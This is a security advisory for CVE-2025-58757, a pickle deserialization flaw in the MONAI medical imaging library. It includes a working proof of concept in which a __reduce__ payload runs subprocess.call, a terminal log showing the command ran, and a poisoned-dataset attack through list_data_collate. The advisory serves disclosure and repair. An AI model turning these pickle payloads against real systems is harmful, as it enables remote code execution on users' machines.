# Monai: Unsafe use of Pickle deserialization may lead to RCE

**GHSA**: GHSA-p8cm-mm2v-gwjm | **CVE**: CVE-2025-58757 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-502

**Affected Packages**:
- **monai** (pip): <= 1.5.0

## Description

>To prevent this report from being deemed inapplicable or out of scope, due to the project's unique nature (for medical applications) and widespread popularity (6k+ stars), it's important to pay attention to some of the project's inherent security issues. (This is because medical professionals may not pay enough attention to security issues when using this project, leading to attacks on services or local machines.)

### Summary
The ```pickle_operations``` function in ```monai/data/utils.py``` automatically handles dictionary key-value pairs ending with a specific suffix and deserializes them using pickle.loads() . This function also lacks any security measures.

When verified using the following proof-of-concept, arbitrary code execution can occur.
```
#Poc
from monai.data.utils import pickle_operations  

import pickle  
import subprocess  
  
class MaliciousPayload:  
    def __reduce__(self):    
        return (subprocess.call, (['touch', '/tmp/hacker1.txt'],))  
  
malicious_data = pickle.dumps(MaliciousPayload())

attack_data = {  
    'image': 'normal_image_data',  
    'label_transforms': malicious_data,  
    'metadata_transforms': malicious_data  
}

result = pickle_operations(attack_data, is_encode=False)  
```

```
#My /tmp directory contents before running the POC
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
autodl.sh.log selenium-managersXRcjF supervisor.sock supervisord.pid
```
Before running the command, there was no hacker1.txt content in my /tmp directory, but after running the command, the command was executed, indicating that the attack was successful.
```
#Running Poc
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
autodl.sh.log  selenium-managersXRcjF  supervisor.sock  supervisord.pid
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# python r1.py 
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
autodl.sh.log  hacker1.txt  selenium-managersXRcjF  supervisor.sock  supervisord.pid
```
The above proof-of-concept is merely a validation of the vulnerability.
The attacker creates malicious dataset content.
```
malicious_data = {
  'image': normal_image_tensor,
  'label': normal_label_tensor,
  'preprocessing_transforms': pickle.dumps(MaliciousPayload()), # Malicious payload
  'augmentation_transforms': pickle.dumps(MaliciousPayload()) # Multiple attack points
}

dataset = [malicious_data, ...]
```
When a user batch-processes data using MONAI's list_data_collate function, the system automatically calls pickle_operations to handle the serialization transformations.
```
from monai.data import list_data_collate

dataloader = DataLoader(
dataset,
batch_size=4,
collate_fn=list_data_collate # Trigger the vulnerability
)

# Automatically execute malicious code while traversing the data

for batch in dataloader:

# Malicious code is executed in pickle_operations

pass
```
When a user loads a serialized file from an external, untrusted source, the remote code execution (RCE) is triggered.

### Impact
Arbitrary code execution

### Repair suggestions
Verify the data source and content before deserializing, or use a safe deserialization method, which should have a similar fix in huggingface's transformer library.
